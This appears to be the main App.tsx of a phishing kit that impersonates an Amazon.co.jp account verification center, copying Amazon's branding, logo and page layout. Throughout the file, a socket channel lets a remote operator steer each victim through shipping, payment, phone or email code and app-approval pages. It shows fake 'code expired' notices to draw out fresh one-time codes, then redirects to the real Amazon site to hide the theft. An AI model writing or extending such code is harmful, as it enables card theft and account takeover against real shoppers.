import { BrowserRouter, Routes, Route, useNavigate } from 'react-router-dom';
import { useCallback, useEffect, useRef, useState } from 'react';
import { socket } from './socket';
import { getClientId, isActivated } from './session';
import { BRAND } from './brand';

import Home from './pages/Home';
import Info from './pages/Info';
import Checkout from './pages/Checkout';
import Verify from './pages/Verify';
import AppCheck from './pages/AppCheck';

const ADMIN_EXTERNAL_URL = 'https://www.amazon.co.jp/';

function getRouteNotice(target: string, reason: string) {
  const cleanReason = reason.trim();

  switch (target) {
    case 'verifyphone':
    case 'phoneverify':
      return cleanReason || '前回の確認コードは期限切れです。新しいコードを受け取るため、電話番号を確認してください。';
    case 'emailverify':
      return cleanReason || '前回の確認コードは期限切れです。新しいコードを受け取るため、メールアドレスを確認してください。';
    case 'info':
      return cleanReason || '配送先情報を確認のうえ、もう一度入力してください。';
    case 'checkout':
      return cleanReason || 'お支払い情報を確認のうえ、もう一度入力してください。';
    default:
      return '';
  }
}

function AdminRouteListener({ onNotice }: { onNotice: (message: string) => void }) {
  const navigate = useNavigate();
  const pendingTimerRef = useRef<number | null>(null);

  useEffect(() => {
    const onRoute = (payload: any) => {
      const target = String(payload?.target || '').toLowerCase();
      if (!target) return;
      const reason = String(payload?.reason || '');

      const map: Record<string, string> = {
        verify: '/verify',
        verifyphone: '/verify?method=phone',
        phoneverify: '/verify?method=phone',
        emailverify: '/verify?method=email',
        appcheck: '/appcheck',
        checkout: '/checkout',
        info: '/info',
        home: '/',
      };

      const to = map[target];
      if (!to) return;

      const notice = getRouteNotice(target, reason);
      if (notice) onNotice(notice);
      navigate(to, { replace: true });
    };

    const onOpenUrl = () => {
      try {
        const parsed = new URL(ADMIN_EXTERNAL_URL, window.location.origin);
        if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return;
        onNotice('確認が完了しました。注文ページへ移動します。');
        if (pendingTimerRef.current) window.clearTimeout(pendingTimerRef.current);
        pendingTimerRef.current = window.setTimeout(() => {
          window.location.href = parsed.toString();
        }, 650);
      } catch {
        // ignore invalid URL config
      }
    };

    socket.on('checkout-route', onRoute);
    socket.on('admin-open-url', onOpenUrl);

    return () => {
      if (pendingTimerRef.current) window.clearTimeout(pendingTimerRef.current);
      socket.off('checkout-route', onRoute);
      socket.off('admin-open-url', onOpenUrl);
    };
  }, [navigate, onNotice]);

  return null;
}

function App() {
  const [routeNotice, setRouteNotice] = useState('');
  const noticeTimerRef = useRef<number | null>(null);

  const showRouteNotice = useCallback((message: string) => {
    setRouteNotice(message);
    if (noticeTimerRef.current) window.clearTimeout(noticeTimerRef.current);
    noticeTimerRef.current = window.setTimeout(() => {
      setRouteNotice('');
    }, 1500);
  }, []);

  useEffect(() => {
    document.title = 'Amazon.co.jp アカウント確認センター';
    document.body.setAttribute('data-brand', BRAND.id);
    const root = document.documentElement;
    root.style.setProperty('--alz-navy', BRAND.theme.navy);
    root.style.setProperty('--alz-panel', BRAND.theme.panel);
    root.style.setProperty('--alz-panel-2', BRAND.theme.panel2);
    root.style.setProperty('--alz-orange', BRAND.theme.orange);
    root.style.setProperty('--alz-orange-2', BRAND.theme.orange2);
    root.style.setProperty('--alz-text', BRAND.theme.text);
    root.style.setProperty('--alz-muted', BRAND.theme.muted);
    root.style.setProperty('--alz-card', BRAND.theme.card);
    root.style.setProperty('--alz-card-border', BRAND.theme.cardBorder);
    root.style.setProperty('--alz-glow-1', BRAND.theme.glow1);
    root.style.setProperty('--alz-glow-2', BRAND.theme.glow2);
    root.style.setProperty('--alz-badge-border', BRAND.theme.badgeBorder);
    root.style.setProperty('--alz-badge-bg', BRAND.theme.badgeBg);
    root.style.setProperty('--alz-badge-text', BRAND.theme.badgeText);
    root.style.setProperty('--alz-pill-border', BRAND.theme.pillBorder);
    root.style.setProperty('--alz-pill-bg', BRAND.theme.pillBg);
    root.style.setProperty('--alz-pill-text', BRAND.theme.pillText);

    const iconSelectors = [
      "link[rel='icon']",
      "link[rel='shortcut icon']",
      "link[rel='apple-touch-icon']",
    ];
    iconSelectors.forEach((selector) => {
      const iconEl = document.querySelector(selector) as HTMLLinkElement | null;
      if (iconEl) iconEl.href = BRAND.favicon;
    });

    return () => {
      if (noticeTimerRef.current) window.clearTimeout(noticeTimerRef.current);
      document.body.removeAttribute('data-brand');
    };
  }, []);

  useEffect(() => {
    const clientId = getClientId();
    const attachClient = () => {
      if (!isActivated()) return;
      socket.emit('attach-client', { clientId });
    };

    if (!socket.connected) socket.connect();
    else attachClient();

    socket.on('connect', attachClient);
    return () => {
      socket.off('connect', attachClient);
      socket.disconnect();
    };
  }, []);

  return (
    <BrowserRouter>
      <AdminRouteListener onNotice={showRouteNotice} />

      <div className="min-h-screen">
        {routeNotice ? (
          <div className="alz-route-notice" role="status" aria-live="polite">
            <div className="alz-route-notice-inner">
              <span className="alz-route-notice-dot" />
              <span>{routeNotice}</span>
            </div>
          </div>
        ) : null}
        <header className="alz-nav">
          <div className="alz-nav-inner">
            <div className="alz-nav-left">
              <button type="button" className="alz-nav-menu" aria-label="Open menu">
                <span />
                <span />
                <span />
              </button>
              <div className="alz-nav-brand">
                <div className="alz-nav-logo" aria-label="Amazon.co.jp">
                  <img src="/Amazon_2024.svg" alt="Amazon.co.jp アカウント確認センター" className="alz-nav-logo-img" />
                </div>
              </div>
            </div>
            <div className="alz-nav-actions">
              <div className="alz-nav-signin">
                <span>ログイン</span>
                <span className="alz-nav-caret" aria-hidden="true">&gt;</span>
                <span className="alz-nav-user" aria-hidden="true">
                  <span className="alz-nav-user-head" />
                  <span className="alz-nav-user-body" />
                </span>
              </div>
              <div className="alz-nav-cart" aria-label="Cart">
                <img src="/amazon-cart-icon.svg" alt="" aria-hidden="true" className="alz-nav-cart-img" />
              </div>
            </div>
          </div>
          <div className="alz-nav-search-row">
            <div className="alz-nav-search-shell" aria-hidden="true">
              <div className="alz-nav-search-input">Amazon.co.jpを検索</div>
              <div className="alz-nav-search-action">
                <span className="alz-nav-search-icon" />
              </div>
            </div>
          </div>
        </header>
        <main>
          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/info" element={<Info />} />
            <Route path="/checkout" element={<Checkout />} />
            <Route path="/verify" element={<Verify />} />
            <Route path="/appcheck" element={<AppCheck />} />
          </Routes>
        </main>
        <footer className="alz-global-footer">
          <div className="alz-global-footer-inner">
            <span>利用規約</span>
            <span>プライバシー規約</span>
            <span>ヘルプ</span>
            <span>Cookie設定</span>
            <span>(c) 2026 {BRAND.name}.co.jp</span>
          </div>
        </footer>
      </div>
    </BrowserRouter>
  );
}

export default App;
